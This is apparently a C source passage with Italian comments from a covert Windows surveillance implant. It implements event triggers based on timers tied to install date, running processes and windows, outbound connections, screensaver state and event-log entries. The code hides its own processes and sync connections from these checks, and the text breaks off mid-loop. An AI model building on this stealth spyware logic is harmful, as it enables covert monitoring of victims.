// Ogni Event Monitor ha tre funzioni, una per start, una per stop
// e una per istruire una nuova condizione da monitorare

// Definita dentro SM_Core.cpp, di cui questo file e' un include
void TriggerEvent(DWORD);

// Codici degli event monitor
#define EM_TIMER 0
#define EM_PROCMON 1
#define EM_CONNMON 2
#define EM_SCREENS 3
#define EM_WINEVEN 4
#define EM_QUOTA   5


//---------------------------------------------------
// TIMER EVENT MONITOR

#define EM_TIMER_SING 0	 // Aspetta n millisecondi (DWORD) da quando parte il monitor 
#define EM_TIMER_REPD 1  // Ogni n millisecondi (DWORD) da quando parte il monitor
#define EM_TIMER_DATE 2	 // Attende una determinata data (DWORD64 100-nanosec da 1 gennaio 1601)
#define EM_TIMER_INST 3  // Attende un determinato intervallo (DWORD64 100-nanosec) dalla data di creazione del file
#define EM_TIMER_DAIL 4  // Azione di start dopo n millisecondi dalla mezzanotte (ogni giorno). Stessa cosa per azione di stop

#define EM_TM_SLEEPTIME 300

// C'e' un signolo thread per i timer DATE, INST e DAIL, piu' un thread per ogni timer
// di tipo SING e REPD.
// I timer SING e REPD hanno un delay massimo di 49.7 giorni (la parte hi_delay
// non viene considerata a causa della Sleep).
// Le date (data e installazione) sono GMT.

typedef struct {
	DWORD lo_delay; // millisecondi di attesa per SING o REPD, oppure parte bassa dei 100-nanosec della data
	DWORD hi_delay; // parte alta dei 100-nanosec della data (dal 1 gennaio 1601)
	BYTE  timer_type;
	DWORD event_code;
	DWORD end_action; // per le fasce orarie (tipo DAILY)
	BOOL triggered; // per i delay di tipo data indica se e' stato gia' rilevato
	BOOL cp;        // semaforo per l'uscita dei thread timer
	HANDLE thread_id; // Solo per i timer SING e REPD
} monitored_timer;


DWORD em_tm_timer_count = 0;
HANDLE em_tm_montime_thread = 0;
monitored_timer *em_tm_timer_table = NULL;

BOOL em_tm_cp = FALSE;


// ritorna la data (100-nanosec dal 1601) di creazione di "filename"
// XXX Attenzione a come il file viene aperto (dovrei aggiungere FILE_SHARE_WRITE)
BOOL GetFileDate(char *filename, nanosec_time *time)
{
	HANDLE fileh;
	FILETIME filetime;

	// XXX Attenzione a come il file viene aperto (dovrei aggiungere FILE_SHARE_WRITE)
	fileh = FNC(CreateFileA)(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

	if (fileh == INVALID_HANDLE_VALUE)
		return FALSE;

	if (!FNC(GetFileTime)(fileh, &filetime, NULL, NULL)) {
		CloseHandle(fileh);
		return FALSE;
	}

	time->hi_delay = filetime.dwHighDateTime;
	time->lo_delay = filetime.dwLowDateTime;

	CloseHandle(fileh);
	return TRUE;
}


// Aggiunge alla data un delay in 100-nanosec.
// Il risultato viene messo nel primo parametro.
void AddNanosecTime(nanosec_time *time_date, nanosec_time *time_delay)
{
	DWORD partial_sum;

	time_date->hi_delay += time_delay->hi_delay;
	partial_sum = time_date->lo_delay + time_delay->lo_delay;

	// controlla se c'e' stato un riporto
	if (partial_sum < time_date->lo_delay)
		time_date->hi_delay++;

	time_date->lo_delay = partial_sum;
}


// Ritorna TRUE se la prima data e' maggiore della seconda (in 100-nanosec)
BOOL IsGreaterDate(nanosec_time *date, nanosec_time *dead_line)
{
	// Controlla prima la parte alta
	if (date->hi_delay > dead_line->hi_delay)
		return TRUE;

	if (date->hi_delay < dead_line->hi_delay)
		return FALSE;

	// Se arriva qui vuol dire che la parte alta e' uguale
	// allora controlla la parte bassa
	if (date->lo_delay > dead_line->lo_delay)
		return TRUE;

	return FALSE;
}


// Thread per i delay
#define TIMER_DELAY_INTERVAL 100
DWORD TimerMonitorSingleDelay(monitored_timer *timer)
{
	DWORD i;

	// Se e' di tipo EM_TIMER_REPD continua a ripetere 
	do {
		// -> Sleep(timer->lo_delay);
		for (i=0; i<=(timer->lo_delay / TIMER_DELAY_INTERVAL); i++) {
			CANCELLATION_POINT(timer->cp);
			Sleep(TIMER_DELAY_INTERVAL); 
		}

		TriggerEvent(timer->event_code);
	} while(timer->timer_type == EM_TIMER_REPD);

	// Se e' un SINGD aspetta che venga terminato senza fare 
	// piu' niente.
	LOOP {
		CANCELLATION_POINT(timer->cp);
		Sleep(TIMER_DELAY_INTERVAL); 
	}

	return 0;
}


// Thread per le date
DWORD TimerMonitorDates(DWORD dummy)
{
	DWORD i;
	nanosec_time local_time, event_time;

	LOOP {
		CANCELLATION_POINT(em_tm_cp);
		Sleep(EM_TM_SLEEPTIME);

		// Legge la data attuale (in 100-nanosec)...
		if (!HM_GetDate(&local_time)) 
			continue;

		// Aggiusta la data letta con il delta contenuto nel file di
		// configurazione.
		AddNanosecTime(&local_time, &date_delta);

		// ...e la confronta con tutte quelle da monitorare
		for (i=0; i<em_tm_timer_count; i++) {
			event_time.lo_delay = em_tm_timer_table[i].lo_delay;
			event_time.hi_delay = em_tm_timer_table[i].hi_delay;

			// Se e' del tipo "fascia oraria" vede se ci siamo dentro o se ne siamo usciti
			if (em_tm_timer_table[i].timer_type == EM_TIMER_DAIL) {
				FILETIME ft;
				SYSTEMTIME st;
				ft.dwLowDateTime  = local_time.lo_delay;
				ft.dwHighDateTime = local_time.hi_delay; 
				if (FileTimeToSystemTime(&ft, &st)) {
					DWORD ms_from_midnight = ((((st.wHour*60) + st.wMinute)*60) + st.wSecond)*1000;
					// Se non era triggerato e entriamo nella fascia
					if (!em_tm_timer_table[i].triggered && ms_from_midnight<event_time.hi_delay && ms_from_midnight>event_time.lo_delay) {
						em_tm_timer_table[i].triggered = TRUE;
						TriggerEvent(em_tm_timer_table[i].event_code);
					}

					// Se era triggerato e ora siamo fuori dalla fascia
					if (em_tm_timer_table[i].triggered && (ms_from_midnight>event_time.hi_delay || ms_from_midnight<event_time.lo_delay)) {
						em_tm_timer_table[i].triggered = FALSE;
						TriggerEvent(em_tm_timer_table[i].end_action);
					}
				}
			}

			// Se e' del tipo data, se non e' triggerato e se l'attesa e' scaduta
			// allora lo triggera
			if ( (em_tm_timer_table[i].timer_type == EM_TIMER_DATE || em_tm_timer_table[i].timer_type == EM_TIMER_INST) &&
				 !em_tm_timer_table[i].triggered &&
				 IsGreaterDate(&local_time, &event_time)) {
				em_tm_timer_table[i].triggered = TRUE;
				TriggerEvent(em_tm_timer_table[i].event_code);
			}
		}
	}

	return 0;
}


void WINAPI EM_TimerAdd(BYTE *conf_ptr, DWORD dummy, DWORD event)
{
	typedef struct {
		DWORD timer_type; 
		DWORD lo_delay;
		DWORD hi_delay;
		DWORD end_action;
	} conf_entry_t;
	conf_entry_t *conf_entry;
	void *temp_table;
	nanosec_time install_time;
	char dll_path[DLLNAMELEN];

	// Controlla anche che il puntatore non sia nullo
	if ( !(conf_entry = (conf_entry_t *)conf_ptr) )
		return;

	// XXX...altro piccolo ed improbabile int overflow....
	if ( !(temp_table = realloc(em_tm_timer_table, (em_tm_timer_count + 1)*sizeof(monitored_timer))) )
		return;

	em_tm_timer_table = (monitored_timer *)temp_table;
	em_tm_timer_table[em_tm_timer_count].thread_id = 0;
	em_tm_timer_table[em_tm_timer_count].event_code = event;
	em_tm_timer_table[em_tm_timer_count].triggered = FALSE;
	em_tm_timer_table[em_tm_timer_count].cp = FALSE;
	em_tm_timer_table[em_tm_timer_count].timer_type = (BYTE)conf_entry->timer_type;

	if (conf_entry->timer_type == EM_TIMER_DAIL) 
		em_tm_timer_table[em_tm_timer_count].end_action = conf_entry->end_action;
	else
		em_tm_timer_table[em_tm_timer_count].end_action = 0xFFFFFFFF;

	if (conf_entry->timer_type == EM_TIMER_INST) {
		if (GetFileDate(HM_CompletePath(H4DLLNAME, dll_path), &install_time)) {
			nanosec_time install_delay;

			install_delay.lo_delay = conf_entry->lo_delay;
			install_delay.hi_delay = conf_entry->hi_delay;

			// Aggiunge al delay la data di installazione
			AddNanosecTime(&install_delay, &install_time);

			// Effettua anche la correzione col delta data
			AddNanosecTime(&install_delay, &date_delta);

			// Il risultato e' la data (in 100-nanosec) da attendere
			em_tm_timer_table[em_tm_timer_count].lo_delay = install_delay.lo_delay;
			em_tm_timer_table[em_tm_timer_count].hi_delay = install_delay.hi_delay;
		} else {
			// Se non riesce a leggere la data di installazione setta l'attesa di 
			// una data che non arrivera' mai...
			em_tm_timer_table[em_tm_timer_count].lo_delay = 0xffffffff;
			em_tm_timer_table[em_tm_timer_count].hi_delay = 0xffffffff;
		}
	} else { 
		em_tm_timer_table[em_tm_timer_count].lo_delay = conf_entry->lo_delay;
		em_tm_timer_table[em_tm_timer_count].hi_delay = conf_entry->hi_delay;
	}

	em_tm_timer_count++;
}


void WINAPI EM_TimerStart()
{
	DWORD i, dummy;
	BOOL is_timer_date = FALSE; // e' TRUE se ci sono timer di tipo EM_TIMER_DATE, EM_TIMER_INST o EM_TIMER_DAIL

	// Lancia i thread di delay 
	for (i=0; i<em_tm_timer_count; i++) {
		if (em_tm_timer_table[i].timer_type == EM_TIMER_REPD || em_tm_timer_table[i].timer_type == EM_TIMER_SING)
			em_tm_timer_table[i].thread_id = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TimerMonitorSingleDelay, (LPVOID)&em_tm_timer_table[i], 0, &dummy);
		else
			is_timer_date = TRUE;
	}

	// Lancia, se deve, il thread di attesa delle date
	if (is_timer_date)
		em_tm_montime_thread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TimerMonitorDates, NULL, 0, &dummy);
}


void WINAPI EM_TimerStop()
{
	DWORD i;

	// Cancella il thread dei timer con data
	QUERY_CANCELLATION(em_tm_montime_thread, em_tm_cp);

	// Uccide i thread di delay
	for (i=0; i<em_tm_timer_count; i++) 
		QUERY_CANCELLATION(em_tm_timer_table[i].thread_id, em_tm_timer_table[i].cp);

	SAFE_FREE(em_tm_timer_table);
	em_tm_timer_count = 0;
}

//---------------------------------------------------






















//---------------------------------------------------
// MONITOR DEI PROCESSI
#include <Tlhelp32.h>

#define PR_WINDOW_MASK 1
#define PR_FOREGROUND_MASK 2
typedef struct {
	WCHAR *proc_name;
	DWORD isWindow;
	DWORD isForeground;
	BOOL present;
	DWORD event_code_found;
	DWORD event_code_notf;
} monitored_proc;

typedef struct {
	DWORD index;
	BOOL found;
} enum_win_par_struct;

#define EM_MP_SLEEPTIME 1000

extern int CmpWild(const unsigned char *, const unsigned char *); // XXX Dichiarata in HM_ProcessMonitors.h
extern int CmpWildW(WCHAR *, WCHAR *); // XXX Dichiarata in HM_ProcessMonitors.h
HANDLE em_mp_monproc_thread = 0;
DWORD em_mp_monitor_count = 0;
monitored_proc *em_mp_process_table = NULL;

BOOL em_mp_cp = FALSE;


BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) 
{
	enum_win_par_struct *enum_win_par;
	enum_win_par = (enum_win_par_struct *)lParam;
	WCHAR window_name[256];

	if (!HM_SafeGetWindowTextW(hwnd, window_name, (sizeof(window_name)/sizeof(WCHAR))-1))
		return TRUE;
	// NULL Termina (nel caso di troncature)
	window_name[(sizeof(window_name)/sizeof(WCHAR))-1] = 0;
	if (CmpWildW(em_mp_process_table[enum_win_par->index].proc_name, window_name)) {
		enum_win_par->found = TRUE;
		return FALSE;
	}
	// Continua la ricerca
	return TRUE;
}

BOOL CmpFrontWindowName(WCHAR *str)
{
	HWND front_wind;
	WCHAR window_name[256];
	front_wind = GetForegroundWindow();
	if (!front_wind)
		return FALSE;

	if (!HM_SafeGetWindowTextW(front_wind, window_name, (sizeof(window_name)/sizeof(WCHAR))-1))
		return FALSE;

	window_name[(sizeof(window_name)/sizeof(WCHAR))-1] = 0;
	if (CmpWildW(str, window_name)) 
		return TRUE;
	
	return FALSE;
}

BOOL CmpFrontProcName(WCHAR *str)
{
	WCHAR *proc_name = NULL;
	HWND front_wind;
	DWORD proc_id = 0;
	
	front_wind = GetForegroundWindow();
	if (!front_wind)
		return FALSE;

	GetWindowThreadProcessId(front_wind, &proc_id);
	if (!proc_id)
		return FALSE;

	proc_name = HM_FindProcW(proc_id);
	if (!proc_name)
		return FALSE;

	if (CmpWildW(str, proc_name)) {
		SAFE_FREE(proc_name);
		return TRUE;
	}
	
	SAFE_FREE(proc_name);
	return FALSE;
}

DWORD MonitorProcesses(DWORD dummy)
{
	HANDLE proc_snap;
	PROCESSENTRY32W lppe;
	DWORD index;
	BOOL process_found;
	enum_win_par_struct enum_win_par;
	pid_hide_struct pid_hide = NULL_PID_HIDE_STRUCT;

	LOOP {
		CANCELLATION_POINT(em_mp_cp);

		// Cicla per tutti quelli dove stiamo cercando una finestra
		for (index=0; index<em_mp_monitor_count; index++) {
			// Solo se cerchiamo il nome della finestra
			if (!em_mp_process_table[index].isWindow)
				continue;
			enum_win_par.index = index;
			enum_win_par.found = FALSE;

			if (!em_mp_process_table[index].isForeground) {
				// La funzione di call-back setta enum_win_par.found
				FNC(EnumWindows)(EnumWindowsProc, (LPARAM)&enum_win_par);
			} else {
				// Se invece deve compararla solo con la finestra in foreground...
				enum_win_par.found = CmpFrontWindowName(em_mp_process_table[index].proc_name);
			}

			if (enum_win_par.found && !em_mp_process_table[index].present) {
				em_mp_process_table[index].present = TRUE;
				TriggerEvent(em_mp_process_table[index].event_code_found);
			}

			if (!enum_win_par.found && em_mp_process_table[index].present) {
				em_mp_process_table[index].present = FALSE;
				TriggerEvent(em_mp_process_table[index].event_code_notf);
			}
		}

		// Cicla per tutti quelli dove stiamo cercando il nome del processo
		proc_snap = FNC(CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, NULL);
		if (proc_snap == INVALID_HANDLE_VALUE) {
			Sleep(EM_MP_SLEEPTIME);
			continue;
		}
		// Cicla i processi nella process_table
		for (index=0; index<em_mp_monitor_count; index++) {
			// Solo se stiamo cercando il nome del processo
			if (em_mp_process_table[index].isWindow)
				continue;

			// Se devo considerare solo il processo in foreground
			if (em_mp_process_table[index].isForeground) {
				process_found = CmpFrontProcName(em_mp_process_table[index].proc_name);

				if (process_found && !em_mp_process_table[index].present) {
					em_mp_process_table[index].present = TRUE;
					TriggerEvent(em_mp_process_table[index].event_code_found);
				}

				if (!process_found && em_mp_process_table[index].present) {
					em_mp_process_table[index].present = FALSE;
					TriggerEvent(em_mp_process_table[index].event_code_notf);
				}
				continue;
			}

			// Se devo considerare tutti i processi...
			lppe.dwSize = sizeof(PROCESSENTRY32W);
			if (FNC(Process32FirstW)(proc_snap,  &lppe)) {
				process_found = FALSE;
				// Cicla tutti i processi attivi...
				do {
					// Non considera i processi che stiamo nascondendo.
					// C'e' una VAGHISSIMA possibilita' di race condition
					// con l'iexporer lanciato per la sync, ma al massimo fa compiere
					// una action di sync in piu'....
					SET_PID_HIDE_STRUCT(pid_hide, lppe.th32ProcessID);
					if (AM_IsHidden(HIDE_PID, &pid_hide))
						continue;

					// ...e li compara con quelli nella tabella
					if (!wcsicmp(lppe.szExeFile, em_mp_process_table[index].proc_name)) {
						// Se il processo e' presente e non era ancora stato rilevato, lancia il primo evento
						if (!em_mp_process_table[index].present) {
							em_mp_process_table[index].present = TRUE;
							TriggerEvent(em_mp_process_table[index].event_code_found);
						}
						process_found = TRUE;
						break;
					}
				} while(FNC(Process32NextW)(proc_snap,  &lppe));

				// Se il processo era stato rilevato come presente, ma adesso non lo e' piu'
				// lancia il secondo evento
				if (em_mp_process_table[index].present && !process_found) {
					em_mp_process_table[index].present = FALSE;
					TriggerEvent(em_mp_process_table[index].event_code_notf);
				}
			}
		}		
		CloseHandle(proc_snap);
		Sleep(EM_MP_SLEEPTIME);
	}

	// not reached
	return 0;
}


void WINAPI EM_MonProcAdd(BYTE *conf_ptr, DWORD dummy, DWORD event)
{
	typedef struct {
		DWORD event_notf; // Evento da scatenare quando il processo non e' piu' presente
		DWORD flags;	  // E' 1 se stiamo cercando il nome di una finestra, 0 per il nome di un processo, 2 per solo il foreground
		char proc_name[1]; // Nome del processo da monitorare (NULL terminated)
	} conf_entry_t;
	conf_entry_t *conf_entry;
	void *temp_table;
	unsigned char *ptr;

	// Controlla anche che il puntatore non sia nullo
	if ( !(conf_entry = (conf_entry_t *)conf_ptr) )
		return;

	// salta la stringa in ascii, controlla il delimitatore e punta alla parte UTF16
	ptr = (unsigned char *)conf_entry->proc_name;
	ptr += strlen((char *)ptr);
	ptr++;
	if (ptr[0] != 0xDE || ptr[1] != 0xAD)
		return;
	ptr += 2;

	// XXX...altro piccolo ed improbabile int overflow....
	if ( !(temp_table = realloc(em_mp_process_table, (em_mp_monitor_count + 1)*sizeof(monitored_proc))) )
		return;

	em_mp_process_table = (monitored_proc *)temp_table;
	em_mp_process_table[em_mp_monitor_count].event_code_found = event;
	em_mp_process_table[em_mp_monitor_count].event_code_notf = conf_entry->event_notf;
	em_mp_process_table[em_mp_monitor_count].proc_name = wcsdup((WCHAR *)ptr);
	em_mp_process_table[em_mp_monitor_count].isWindow = (conf_entry->flags & PR_WINDOW_MASK);
	em_mp_process_table[em_mp_monitor_count].isForeground = (conf_entry->flags & PR_FOREGROUND_MASK);
	em_mp_process_table[em_mp_monitor_count].present = FALSE;

	em_mp_monitor_count++;
}


void WINAPI EM_MonProcStart()
{
	DWORD dummy;
	// Crea il thread solo se ci sono processi da monitorare
	if (em_mp_monitor_count>0)
		em_mp_monproc_thread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorProcesses, NULL, 0, &dummy);
}


void WINAPI EM_MonProcStop()
{
	DWORD i;

	QUERY_CANCELLATION(em_mp_monproc_thread, em_mp_cp);
	
	// Libera tutte le strutture allocate
	for (i=0; i<em_mp_monitor_count; i++)
		SAFE_FREE(em_mp_process_table[i].proc_name);
	SAFE_FREE(em_mp_process_table);
	em_mp_monitor_count = 0;
}














//---------------------------------------------------
// MONITOR DELLE CONNESSIONI
#include <Iphlpapi.h>
typedef DWORD (WINAPI *GetIpAddrTable_t)(PMIB_IPADDRTABLE, PULONG, BOOL);
typedef DWORD (WINAPI *GetTcpTable_t)(PMIB_TCPTABLE_OWNER_PID, PDWORD, BOOL, ULONG, TCP_TABLE_CLASS, ULONG);


typedef struct {
	DWORD ip_address;
	DWORD netmask;
	DWORD port;
	BOOL present;
	DWORD event_code;
} monitored_conn;

#define EM_MC_SLEEPTIME 300

HANDLE em_mc_monconn_thread = 0;
DWORD em_mc_connection_count = 0;
monitored_conn *em_mc_connection_table = NULL;
MIB_IPADDRTABLE *em_mc_localip = NULL;
HMODULE h_iphlp = NULL;
GetIpAddrTable_t pGetIpAddrTable = NULL;
GetTcpTable_t pGetTcpTable = NULL;

BOOL em_mc_cp = FALSE;


// Inizializza la tabella degli indirizzi locali 
void InitIPAddrLocal()
{
	DWORD dwSize;

	// Alloca e verifica
	SAFE_FREE(em_mc_localip);
	if (! (em_mc_localip = (MIB_IPADDRTABLE *)malloc(sizeof(MIB_IPADDRTABLE))) )
		return;

	dwSize = 0;
	// XXX La verifica che il puntatore pGetIpAddrTable sia valorizzato, viene
	// fatta dal chiamante.
	if (pGetIpAddrTable(em_mc_localip, &dwSize, FALSE) == ERROR_INSUFFICIENT_BUFFER) {
		SAFE_FREE(em_mc_localip);
		if (! (em_mc_localip = (MIB_IPADDRTABLE *)malloc((UINT) dwSize)) )
			return;
	}

	if (pGetIpAddrTable(em_mc_localip, &dwSize, FALSE) != NO_ERROR) 
		SAFE_FREE(em_mc_localip);
}

// Torna TRUE se i due IP sono nella stessa subnet
BOOL IPNetCmp(DWORD ip1, DWORD ip2, DWORD netmask)
{
	ip1 &= netmask;
	ip2 &= netmask;
	if (ip1 == ip2)
		return TRUE;
	else
		return FALSE;
}

// Torna TRUE se ip_addr e' nella LAN
BOOL IPAddrIsLocal(DWORD ip_addr)
{
	DWORD i;

	// Controlla che la tabella degli indirizzi sia 
	// stata allocata
	if (!em_mc_localip)
		return FALSE;

	for (i=0; i<em_mc_localip->dwNumEntries; i++) 
		if ( (em_mc_localip->table[i].dwAddr & em_mc_localip->table[i].dwMask) ==
			 (ip_addr & em_mc_localip->table[i].dwMask) && em_mc_localip->table[i].dwMask)
			return TRUE;

	return FALSE;
}


DWORD MonitorConnection(DWORD dummy)
{
	PMIB_TCPTABLE_OWNER_PID pTcpTable;
	pid_hide_struct pid_hide = NULL_PID_HIDE_STRUCT;
	DWORD i, j, dwSize;
	BOOL conn_found;

	// Se non e' stata inizializzata, carica iphlpapi.dll.
	// Lo fa una volta sola.
	if (!h_iphlp) {
		if ( (h_iphlp = LoadLibrary("iphlpapi.dll")) ) {
			pGetIpAddrTable = (GetIpAddrTable_t)HM_SafeGetProcAddress(h_iphlp, "GetIpAddrTable");
			pGetTcpTable = (GetTcpTable_t)HM_SafeGetProcAddress(h_iphlp, "GetExtendedTcpTable");
		}
	}

	LOOP {
		CANCELLATION_POINT(em_mc_cp);

		// Verifica di avere le funzioni che servono, altrimenti non fa nulla
		// e aspetta solo di terminare
		if (!pGetTcpTable || !pGetIpAddrTable) {
			Sleep(EM_MC_SLEEPTIME);
			continue;
		}

		// Lo fa ogni volta perche' l'indirizzo potrebbe non essere disponibile da suibito (es:dhcp)
		// o la macchina potrebbe non essere collegata in rete, o l'utente potrebbe riconfigurarlo a mano
		InitIPAddrLocal();

		dwSize = sizeof(MIB_TCPTABLE_OWNER_PID);
		pTcpTable = (MIB_TCPTABLE_OWNER_PID *) malloc(sizeof(MIB_TCPTABLE_OWNER_PID));
		if (!pTcpTable) 
			continue;

		// Legge la quantita' di memoria necessaria a contenere la tabella
		if (pGetTcpTable(pTcpTable, &dwSize, FALSE, AF_INET, TCP_TABLE_OWNER_PID_CONNECTIONS, 0) == ERROR_INSUFFICIENT_BUFFER) {
			SAFE_FREE(pTcpTable);
			pTcpTable = (MIB_TCPTABLE_OWNER_PID *) malloc ((UINT) dwSize);
			if (!pTcpTable) {
				Sleep(EM_MC_SLEEPTIME);
				continue;
			}
		}

		// Ottiene la tabella delle connessionei TCP
		if (pGetTcpTable(pTcpTable, &dwSize, FALSE, AF_INET, TCP_TABLE_OWNER_PID_CONNECTIONS, 0) == NO_ERROR) {
			// Cicla le connessioni da monitorare
			for (i=0; i<em_mc_connection_count; i++) {
				conn_found = FALSE;
				// Cicla le connessioni stabilite
				for (j=0; j<pTcpTable->dwNumEntries; j++) {
					// Non considera le connessioni fatte dai processi nascosti da noi
					// (ad esempio quelle di iexplorer durante la sync)
					SET_PID_HIDE_STRUCT(pid_hide, pTcpTable->table[j].dwOwningPid);
					if (AM_IsHidden(HIDE_PID, &pid_hide))
						continue;

					// Controlla solo le connessioni attive e non verso la LAN
					if (pTcpTable->table[j].dwState != MIB_TCP_STATE_LISTEN && 
						pTcpTable->table[j].dwState != MIB_TCP_STATE_TIME_WAIT &&
						!IPAddrIsLocal(pTcpTable->table[j].dwRemoteAddr) ) {
						// Controlla che IP e porta da monitorare siano nulli (wildcard) o uguali a 
						// quelli della connessione attualmente in esame.  
						if ((!em_mc_connection_table[i].ip_address || IPNetCmp(em_mc_connection_table[i].ip_address, pTcpTable->table[j].dwRemoteAddr, em_mc_connection_table[i].netmask)) &&
							(!em_mc_connection_table[i].port || em_mc_connection_table[i].port == pTcpTable->table[j].dwRemotePort)) {
							// Controlla che la connessione non sia stata gia' rilevata
							// in un precedente ciclo
							if (!em_mc_connection_table[i].present) {
								em_mc_connection_table[i].present = TRUE;
								TriggerEvent(em_mc_connection_table[i].event_code);
							}
							conn_found = TRUE;
							break;
						}
					}
				}
				// Se la connessione era stata rilevata come presente, ma adesso non lo e' piu',
				// aggiorna la tabella
				if (em_mc_connection_table[i].present && !conn_found) 
					em_mc_connection_table[i].present = FALSE;
			}
		}
		
		SAFE_FREE(pTcpTable);
		Sleep(EM_MC_SLEEPTIME);
	}

	// not reached
	return 0;
}


void WINAPI EM_MonConnAdd(BYTE *conf_ptr, DWORD dummy, DWORD event)
{
	typedef struct {
		DWORD ip_address;
		DWORD netmask;
		WORD port;
	} conf_entry_t;
	conf_entry_t *conf_entry;
	void *temp_table;

	// Controlla anche che il puntatore non sia nullo
	if ( !(conf_entry = (conf_entry_t *)conf_ptr) )
		return;

	// XXX...altro piccolo ed improbabile int overflow....
	if ( !(temp_table = realloc(em_mc_connection_table, (em_mc_connection_count + 1)*sizeof(monitored_conn))) )
		return;

	em_mc_connection_table = (monitored_conn *)temp_table;
	em_mc_connection_table[em_mc_connection_count].event_code = event;
	em_mc_connection_table[em_mc_connection_count].ip_address = conf_entry->ip_address;
	em_mc_connection_table[em_mc_connection_count].netmask = conf_entry->netmask;
	em_mc_connection_table[em_mc_connection_count].port = conf_entry->port;
	em_mc_connection_table[em_mc_connection_count].present = FALSE;

	em_mc_connection_count++;
}


void WINAPI EM_MonConnStart()
{
	DWORD dummy;
	// Crea il thread solo se ci sono connessioni da monitorare
	if (em_mc_connection_count>0) 
		em_mc_monconn_thread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorConnection, NULL, 0, &dummy);
}


void WINAPI EM_MonConnStop()
{
	QUERY_CANCELLATION(em_mc_monconn_thread, em_mc_cp);
	SAFE_FREE(em_mc_connection_table);
	SAFE_FREE(em_mc_localip);
	em_mc_connection_count = 0;
}











//---------------------------------------------------
// MONITOR SALVASCHERMO

DWORD em_ss_event_start = AF_NONE;
DWORD em_ss_event_stop = AF_NONE;
BOOL em_ss_present = FALSE;
HANDLE em_ss_thread = 0;

BOOL em_ss_cp = FALSE;

#define EM_SS_SLEEPTIME 300

BOOL IsSaverRunning()
{ 
	BOOL ret, srunning = FALSE;
	
	// Se fallisce, assume che non si attivo
	// SPI_GETSCREENSAVERRUNNING richiede che WINVER sia>=0x500 
	ret = FNC(SystemParametersInfoA)(SPI_GETSCREENSAVERRUNNING, 0, &srunning, 0);

	return srunning && ret;
}


DWORD MonitorScreenSaver(DWORD dummy)
{
	LOOP {
		CANCELLATION_POINT(em_ss_cp);

		if (IsSaverRunning()) {
			// Se lo screensaver e' presente e non era stato rilevato
			if (!em_ss_present) {
				em_ss_present = TRUE;
				TriggerEvent(em_ss_event_start);
			}
		} else {
			// Se lo screensaver non e' presente ed era stato rilevato
			if (em_ss_present) {
				em_ss_present = FALSE;
				TriggerEvent(em_ss_event_stop);
			}
		}

		Sleep(EM_SS_SLEEPTIME);
	}

	// not reached
	return 0;
}


void WINAPI EM_ScreenSaverAdd(BYTE *conf_ptr, DWORD dummy, DWORD event)
{
	DWORD *event_stop;
	
	if (! (event_stop = (DWORD *)conf_ptr) )
		return;

	em_ss_event_start = event;
	em_ss_event_stop = *event_stop;	
}


void WINAPI EM_ScreenSaverStart()
{
	DWORD dummy;

	// Crea il thread solo se ci sono azioni da fare
	if (em_ss_event_start != AF_NONE || em_ss_event_stop != AF_NONE)
		em_ss_thread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorScreenSaver, NULL, 0, &dummy);
}


void WINAPI EM_ScreenSaverStop()
{
	QUERY_CANCELLATION(em_ss_thread, em_ss_cp);
	em_ss_event_start = AF_NONE;
	em_ss_event_stop = AF_NONE;
	em_ss_present = FALSE;
}









//---------------------------------------------------
// MONITOR DEGLI EVENTI WINDOWS
#define SAFE_CLOSE(x) { if(x) FNC(CloseEventLog)(x); x = 0; }

typedef struct {
	DWORD event_monitored;
	DWORD event_triggered;
} monitored_event;

typedef struct {
	char *source_name;     // nome sorgente eventi
	HANDLE source_handle;  // handle sorgente eventi
	DWORD last_record_num; // numero di eventi presenti nella sorgente all'ultima lettura
	DWORD event_count;     // numero di eventi da monitorare per quella sorgente
	monitored_event *event_array; // array degli eventi da monitorare con relative azioni
} monitored_source;

#define EM_ME_SLEEPTIME 300
#define EM_ME_BUFFER_SIZE 2048

HANDLE em_me_monevent_thread = 0;
DWORD em_me_source_count = 0;
monitored_source *em_me_source_table = NULL;

BOOL em_me_cp = FALSE;


// Thread di monitoring degli eventi
DWORD MonitorWindowsEvent(DWORD dummy)
{
	DWORD i, j, k, new_record_count, oldest_event;
	DWORD dwRead, dwNeeded;
    EVENTLOGRECORD *pevlr; 
    BYTE bBuffer[EM_ME_BUFFER_SIZE];   

	pevlr = (EVENTLOGRECORD *) &bBuffer; 

	LOOP {
		CANCELLATION_POINT(em_me_cp);

		// Cicla fra le sorgenti
		for (i=0; i<em_me_source_count; i++) {
			// Effettua il parsing dei nuovi eventi solo se l'handle alla sorgente e'
			// valido e se riesce a leggere il numero di eventi
			if (!em_me_source_table[i].source_handle ||
				!FNC(GetNumberOfEventLogRecords)(em_me_source_table[i].source_handle, &new_record_count) ||
				!FNC(GetOldestEventLogRecord)(em_me_source_table[i].source_handle, &oldest_event))
				continue;
			
			new_record_count += oldest_event;

			// Cicla fra i nuovi eventi presenti nella sorgente i-esima
			// (non consideriamo l'eventualita' in cui gli eventi possano essere cancellati 
			// selettivamente).
			for (j=em_me_source_table[i].last_record_num; j<new_record_count; j++) {
				// Se non riesce a leggere l'evento j-esimo, passa al successivo
				if (!FNC(ReadEventLogA)(em_me_source_table[i].source_handle, EVENTLOG_SEEK_READ | EVENTLOG_FORWARDS_READ, 
					              j , bBuffer, EM_ME_BUFFER_SIZE, &dwRead, &dwNeeded )) {
					// Se non riesce a leggere potrebbe esserci stata una modifica al registro.
					// Allora prova a chiuderlo e a riaprirlo.
					SAFE_CLOSE(em_me_source_table[i].source_handle);
					em_me_source_table[i].source_handle = FNC(OpenEventLogA)(NULL, em_me_source_table[i].source_name);

					// Se fallisce la riapertura esce dal ciclo e non considera piu' la sorgente
					if (!em_me_source_table[i].source_handle)
						break;

					// Se fallisce la seconda lettura allora c'e' un errore di tipo diverso.
					if (!FNC(ReadEventLogA)(em_me_source_table[i].source_handle, EVENTLOG_SEEK_READ | EVENTLOG_FORWARDS_READ, 
					              j , bBuffer, EM_ME_BUFFER_SIZE, &dwRead, &dwNeeded ))
						continue;
				}

				// Cicla fra gli eventi da monitorare per la sorgente i-esima
